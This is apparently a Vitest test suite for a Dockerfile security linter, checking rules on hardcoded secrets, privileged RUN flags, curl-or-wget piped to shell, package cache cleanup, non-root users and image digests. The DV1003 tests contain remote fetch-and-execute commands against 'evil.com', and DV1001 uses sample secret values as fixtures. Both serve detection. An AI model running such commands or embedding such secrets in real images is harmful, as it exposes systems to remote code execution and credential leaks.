import { describe, it, expect } from 'vitest';
import { lintDockerfile, hasRule, defaultConfig } from '../helpers';

describe('DV1001 - Hardcoded secrets', () => {
  it('flags ENV with password', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD=mysecret'), 'DV1001')).toBe(true);
  });
  it('flags ARG with secret', () => {
    expect(hasRule(lintDockerfile('ARG API_SECRET=abc123\nFROM ubuntu:20.04'), 'DV1001')).toBe(true);
  });
  it('flags ENV with token', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV AUTH_TOKEN=xyz'), 'DV1001')).toBe(true);
  });
  it('flags ENV with api_key', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV API_KEY=mykey'), 'DV1001')).toBe(true);
  });
  it('passes ENV with variable reference', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD=$EXTERNAL_PASS'), 'DV1001')).toBe(false);
  });
  it('passes ARG without default', () => {
    expect(hasRule(lintDockerfile('ARG API_SECRET\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
  });
  it('passes normal ENV', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV NODE_ENV=production'), 'DV1001')).toBe(false);
  });
  it('passes _FILE suffix ENV (Docker secrets file path convention)', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV MINIO_ACCESS_KEY_FILE=access_key'), 'DV1001')).toBe(false);
  });
  it('passes _FILE suffix with multiple secret path ENVs', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV MINIO_SECRET_KEY_FILE=secret_key MINIO_ROOT_PASSWORD_FILE=secret_key'), 'DV1001')).toBe(false);
  });
  it('flags ARG with encryption_key (cal.com pattern)', () => {
    expect(hasRule(lintDockerfile('ARG CALENDSO_ENCRYPTION_KEY=secret\nFROM ubuntu:20.04'), 'DV1001')).toBe(true);
  });
  it('flags ENV with signing_key', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV JWT_SIGNING_KEY=mykey123'), 'DV1001')).toBe(true);
  });
  it('passes ARG encryption_key without default', () => {
    expect(hasRule(lintDockerfile('ARG ENCRYPTION_KEY\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
  });
  it('passes ARG with _FILE suffix', () => {
    expect(hasRule(lintDockerfile('ARG DB_PASSWORD_FILE=password\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
  });
  it('skips testdata/ directory (Vault pattern)', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV PGPASSWORD=test123', undefined, 'vault/testdata/Dockerfile'), 'DV1001')).toBe(false);
  });
  it('skips test-framework/ directory (Keycloak pattern)', () => {
    expect(hasRule(lintDockerfile('FROM ubi9\nENV PGPASSWORD=test123', undefined, 'test-framework/db-edb/container/Dockerfile'), 'DV1001')).toBe(false);
  });
  it('skips e2e-tests/ directory', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD=dummy', undefined, 'e2e-tests/Dockerfile'), 'DV1001')).toBe(false);
  });
  it('skips _meta/ directory (elastic/beats module test fixture pattern)', () => {
    expect(hasRule(lintDockerfile('FROM mysql:8.0\nENV MYSQL_ROOT_PASSWORD test', undefined, 'metricbeat/module/mysql/_meta/Dockerfile'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV CEPH_DEMO_ACCESS_KEY demo\nENV CEPH_DEMO_SECRET_KEY demo', undefined, 'metricbeat/module/ceph/_meta/Dockerfile.nautilus'), 'DV1001')).toBe(false);
  });
  it('skips ENV with file path value (docker-selenium FP)', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SE_JAVA_SSL_TRUST_STORE_PASSWORD="/opt/selenium/secrets/server.pass"'), 'DV1001')).toBe(false);
  });
  it('skips ENV with private key file path value', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SE_HTTPS_PRIVATE_KEY="/opt/selenium/secrets/tls.key"'), 'DV1001')).toBe(false);
  });
  it('still flags ENV with actual secret value despite path-like name', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SE_SUPERVISORD_UNIX_SERVER_PASSWORD="secret"'), 'DV1001')).toBe(true);
  });
  it('does not flag ARG with empty string default', () => {
    expect(hasRule(lintDockerfile('FROM golang:1.25\nARG TELEMETRY_PRIVATE_KEY=""'), 'DV1001')).toBe(false);
  });
  it('does not flag ARG with empty single-quoted default', () => {
    expect(hasRule(lintDockerfile("FROM golang:1.25\nARG PRIVATE_KEY=''"), 'DV1001')).toBe(false);
  });
  it('flags ARG with quoted non-empty secret value', () => {
    expect(hasRule(lintDockerfile('FROM golang:1.25\nARG PRIVATE_KEY="realvalue123"'), 'DV1001')).toBe(true);
  });
  it('does not flag ARG with boolean/integer value (config flag, not secret)', () => {
    // SCCACHE_S3_NO_CREDENTIALS=0 means "disable credential usage" - a boolean config flag
    expect(hasRule(lintDockerfile('ARG SCCACHE_S3_NO_CREDENTIALS=0\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('ARG USE_CREDENTIALS=1\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SKIP_TOKEN_VALIDATION=true'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV REQUIRE_AUTH_TOKEN=false'), 'DV1001')).toBe(false);
  });
  it('still flags ARG/ENV with non-boolean secret values', () => {
    // Real secrets are non-trivial strings
    expect(hasRule(lintDockerfile('ARG AUTH_TOKEN=abc123xyz\nFROM ubuntu:20.04'), 'DV1001')).toBe(true);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV API_SECRET=mysecret'), 'DV1001')).toBe(true);
  });
  it('does not flag library names that contain "token" as a compound syllable', () => {
    // TIKTOKEN is a BPE tokenizer library, not a security token
    expect(hasRule(lintDockerfile('ARG USE_TIKTOKEN_ENCODING_NAME="cl100k_base"\nFROM ubuntu:20.04'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV TIKTOKEN_ENCODING_NAME=cl100k_base'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV TIKTOKEN_CACHE_DIR=/tmp/tiktoken'), 'DV1001')).toBe(false);
  });
  it('still flags standalone TOKEN and compound security token names', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV MY_TOKEN=abc123'), 'DV1001')).toBe(true);
    expect(hasRule(lintDockerfile('ARG API_TOKEN=mykey\nFROM ubuntu:20.04'), 'DV1001')).toBe(true);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV GITHUB_TOKEN=ghp_abc123'), 'DV1001')).toBe(true);
  });

  it('does not flag ENV with empty quoted value (runtime placeholder)', () => {
    // keptn pattern: ENV API_TOKEN "" — empty string = runtime override expected
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV API_TOKEN ""'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV DB_PASSWORD \'\''), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SECRET_KEY ""'), 'DV1001')).toBe(false);
  });

  it('does not flag angle-bracket placeholder values used as required build stubs', () => {
    // twentyhq/twenty pattern: ENV KEYSTATIC_GITHUB_CLIENT_SECRET="<fake build value>"
    // These are explicit placeholder stubs required by Next.js build but not real secrets.
    expect(hasRule(lintDockerfile('FROM node:24-alpine\nENV KEYSTATIC_GITHUB_CLIENT_SECRET="<fake build value>"'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM node:24-alpine\nENV MY_SECRET="<placeholder>"'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM node:24-alpine\nENV API_KEY="<your-api-key-here>"'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM node:24-alpine\nARG SIGNING_SECRET=<fake build value>\nFROM node:24-alpine'), 'DV1001')).toBe(false);
  });

  it('still flags values that look like real secrets even if they contain placeholder-like words', () => {
    // "admin", "password", "Passw0rd" are real default credentials, not placeholders
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV COUCHDB_PASSWORD=admin'), 'DV1001')).toBe(true);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV SA_PASSWORD=Passw0rd'), 'DV1001')).toBe(true);
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nENV POSTHOG_TOKEN=phc_bIjZL7oh2GEUd2vqvTBH8WvrX0fWTFQMs6H5KQxiUxU'), 'DV1001')).toBe(true);
  });

  it('does not flag _URL/_ENDPOINT/_ADDR/_HOST suffixed vars (these store endpoints, not secrets)', () => {
    // anchore-engine FP: ANCHORE_FEEDS_TOKEN_URL stores an OAuth endpoint URL, not a token.
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV ANCHORE_FEEDS_TOKEN_URL="https://ancho.re/oauth/token"'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV OAUTH_TOKEN_URL=https://auth.example.com/token'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV API_SECRET_ENDPOINT=https://api.example.com/secret'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV AUTH_SECRET_HOST=auth.example.com'), 'DV1001')).toBe(false);
  });

  it('does not flag ENV/ARG whose value is an HTTP(S) URL', () => {
    // An HTTP URL value is a configuration endpoint, not a secret credential.
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV AUTH_TOKEN_ENDPOINT=https://auth.example.com/v1/token'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nARG API_TOKEN_URL=https://api.example.com\nFROM ubuntu'), 'DV1001')).toBe(false);
  });

  it('still flags real token/password values that happen to be non-URL strings', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV OAUTH_TOKEN=abc123secretvalue'), 'DV1001')).toBe(true);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV API_SECRET_KEY=mysupersecretkey'), 'DV1001')).toBe(true);
  });

  it('does not flag instructional placeholder values that tell users to change the value', () => {
    // kimai pattern: ENV APP_SECRET=change_this_to_something_unique — clearly a placeholder instruction
    expect(hasRule(lintDockerfile('FROM php:8.3-fpm\nENV APP_SECRET=change_this_to_something_unique'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV API_SECRET=change_this_value'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV MY_SECRET=change-this-to-your-secret'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV DB_PASSWORD=replace_me_with_real_password'), 'DV1001')).toBe(false);
    expect(hasRule(lintDockerfile('FROM ubuntu\nARG AUTH_TOKEN=change_this\nFROM ubuntu'), 'DV1001')).toBe(false);
  });

  it('still flags non-instructional values even if they contain change-like words', () => {
    // Real secrets shouldn't be skipped just because they happen to contain "change"
    expect(hasRule(lintDockerfile('FROM ubuntu\nENV API_SECRET=mySuperChange123'), 'DV1001')).toBe(true);
  });
});

describe('DV1002 - Privileged operations', () => {
  it('flags --privileged', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN --privileged echo hi'), 'DV1002')).toBe(true);
  });
  it('flags --cap-add', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN --cap-add SYS_ADMIN echo'), 'DV1002')).toBe(true);
  });
  it('passes normal RUN', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN echo hi'), 'DV1002')).toBe(false);
  });
});

describe('DV1003 - Unsafe curl pipe', () => {
  it('flags curl | sh', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/script.sh | sh'), 'DV1003')).toBe(true);
  });
  it('flags curl | bash', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl https://evil.com/script.sh | bash'), 'DV1003')).toBe(true);
  });
  it('flags wget | sh', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN wget -O - https://evil.com/script.sh | sh'), 'DV1003')).toBe(true);
  });
  it('passes safe curl', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN curl -o /tmp/file.sh https://example.com/file.sh'), 'DV1003')).toBe(false);
  });
  it('does not flag wget download + sha256sum verify pattern', () => {
    // Download to file then verify — this is the SAFE pattern
    const df = 'FROM ubuntu:20.04\nRUN wget -O file.tar.bz2 https://example.com/file.tar.bz2; echo "abc123 *file.tar.bz2" | sha256sum -c -';
    expect(hasRule(lintDockerfile(df), 'DV1003')).toBe(false);
  });
  it('does not flag curl piped to sha256sum', () => {
    // curl output piped to sha256sum for checksum verification — NOT a shell execution
    const df = 'FROM ubuntu:20.04\nRUN curl -L https://example.com/file | sha256sum';
    expect(hasRule(lintDockerfile(df), 'DV1003')).toBe(false);
  });
});

describe('DV1004 - Multi-stage build suggestion', () => {
  it('flags single stage with build tools', () => {
    expect(hasRule(lintDockerfile('FROM node:18\nRUN npm run build'), 'DV1004')).toBe(true);
  });
  it('passes multi-stage', () => {
    expect(hasRule(lintDockerfile('FROM node:18 AS builder\nRUN npm run build\nFROM nginx:alpine\nCOPY --from=builder /app/dist /usr/share/nginx/html'), 'DV1004')).toBe(false);
  });
  it('passes without build tools', () => {
    expect(hasRule(lintDockerfile('FROM node:18\nRUN echo hi'), 'DV1004')).toBe(false);
  });
});

describe('DV1005 - .dockerignore recommended', () => {
  it('flags COPY .', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY . /app'), 'DV1005')).toBe(true);
  });
  it('passes specific COPY', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY app.js /app/'), 'DV1005')).toBe(false);
  });
});

describe('DV1006 - Non-root user', () => {
  it('flags no USER instruction', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN echo hi'), 'DV1006')).toBe(true);
  });
  it('passes with USER', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nUSER nobody'), 'DV1006')).toBe(false);
  });
  it('skips distroless nonroot base images', () => {
    expect(hasRule(lintDockerfile('FROM gcr.io/distroless/static-debian13:nonroot\nCOPY app /app'), 'DV1006')).toBe(false);
  });
  it('skips nonroot tag variants', () => {
    expect(hasRule(lintDockerfile('FROM gcr.io/distroless/base-debian12:nonroot-amd64\nCOPY app /app'), 'DV1006')).toBe(false);
  });
  it('skips chainguard static base images', () => {
    expect(hasRule(lintDockerfile('FROM cgr.dev/chainguard/static@sha256:abc123\nCOPY app /app'), 'DV1006')).toBe(false);
  });
  it('resolves stage alias to original base image', () => {
    const df = 'FROM cgr.dev/chainguard/static@sha256:abc AS distroless_source\nFROM ubuntu AS builder\nRUN make\nFROM distroless_source\nCOPY --from=builder /app /app';
    expect(hasRule(lintDockerfile(df), 'DV1006')).toBe(false);
  });
  it('skips FROM scratch (no shell/passwd available)', () => {
    expect(hasRule(lintDockerfile('FROM scratch\nCOPY app /app\nCMD ["/app"]'), 'DV1006')).toBe(false);
  });
});

describe('DV1007 - Package manager cache not cleaned', () => {
  it('flags apt-get without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN apt-get install -y curl'), 'DV1007')).toBe(true);
  });
  it('passes apt-get with cleanup', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nRUN apt-get install -y curl && rm -rf /var/lib/apt/lists/*'), 'DV1007')).toBe(false);
  });
  it('flags yum without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM centos:7\nRUN yum install -y curl'), 'DV1007')).toBe(true);
  });
  it('flags dnf without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM fedora:35\nRUN dnf install -y curl'), 'DV1007')).toBe(true);
  });
  it('flags microdnf without cleanup', () => {
    expect(hasRule(lintDockerfile('FROM fedora:35\nRUN microdnf install -y curl'), 'DV1007')).toBe(true);
  });
  it('passes microdnf with cleanup', () => {
    expect(hasRule(lintDockerfile('FROM fedora:35\nRUN microdnf install -y curl && microdnf clean all'), 'DV1007')).toBe(false);
  });
  it('does not flag tdnf as dnf (Photon OS)', () => {
    expect(hasRule(lintDockerfile('FROM photon:5.0\nRUN tdnf install -y nginx && tdnf clean all'), 'DV1007')).toBe(false);
  });
  it('recognizes rm --recursive --force --verbose as cleanup (paperless-ngx)', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:24.04\nRUN apt-get update && apt-get install -y curl && rm --recursive --force --verbose /var/lib/apt/lists/*'), 'DV1007')).toBe(false);
  });
  it('recognizes rm --recursive --force as cleanup', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:24.04\nRUN apt-get update && apt-get install -y curl && rm --force --recursive /var/lib/apt/lists/*'), 'DV1007')).toBe(false);
  });
  it('skips apt-get in non-final build stage (gotify pattern)', () => {
    const df = `FROM node:24 AS js-builder
RUN apt-get update && apt-get install -y git
FROM debian:sid-slim
RUN apt-get update && apt-get install -y curl && rm -rf /var/lib/apt/lists/*`;
    expect(hasRule(lintDockerfile(df), 'DV1007')).toBe(false);
  });
});

describe('DV1008 - COPY . . too broad', () => {
  it('flags COPY . .', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY . .'), 'DV1008')).toBe(true);
  });
  it('flags COPY . /app', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY . /app'), 'DV1008')).toBe(true);
  });
  it('passes specific COPY', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04\nCOPY package.json /app/'), 'DV1008')).toBe(false);
  });
});

describe('DV1009 - Unpinned digest', () => {
  it('flags no digest', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu:20.04'), 'DV1009')).toBe(true);
  });
  it('passes with digest', () => {
    expect(hasRule(lintDockerfile('FROM ubuntu@sha256:abc123'), 'DV1009')).toBe(false);
  });
  it('skips scratch', () => {
    expect(hasRule(lintDockerfile('FROM scratch'), 'DV1009')).toBe(false);
  });
  it('skips stage aliases', () => {
    expect(hasRule(lintDockerfile('FROM node:20 AS builder\nRUN npm ci\nFROM alpine:3.19\nCOPY --from=builder /app /app'), 'DV1009')).toBe(true);
    // The 'builder' stage reference should not trigger DV1009
    const df = 'FROM node:20 AS builder\nRUN npm ci\nFROM builder';
    const results = lintDockerfile(df);
    const dv1009 = results.filter(r => r.rule === 'DV1009');
    expect(dv1009.length).toBe(1); // only node:20, not builder
    expect(dv1009[0].message).toContain('node');
  });
  it('skips ARG variable references', () => {
    const df = 'ARG BASE_IMAGE=ubuntu:20.04\nFROM ${BASE_IMAGE}';
    expect(hasRule(lintDockerfile(df), 'DV1009')).toBe(false);
  });
  it('skips $VAR without braces', () => {
    const df = 'ARG IMG=node:20\nFROM $IMG';
    expect(hasRule(lintDockerfile(df), 'DV1009')).toBe(false);
  });
  it('skips Jinja2 template variables', () => {
    const df = 'FROM {{ base_image }}:{{ version }}';
    expect(hasRule(lintDockerfile(df), 'DV1009')).toBe(false);
  });
});
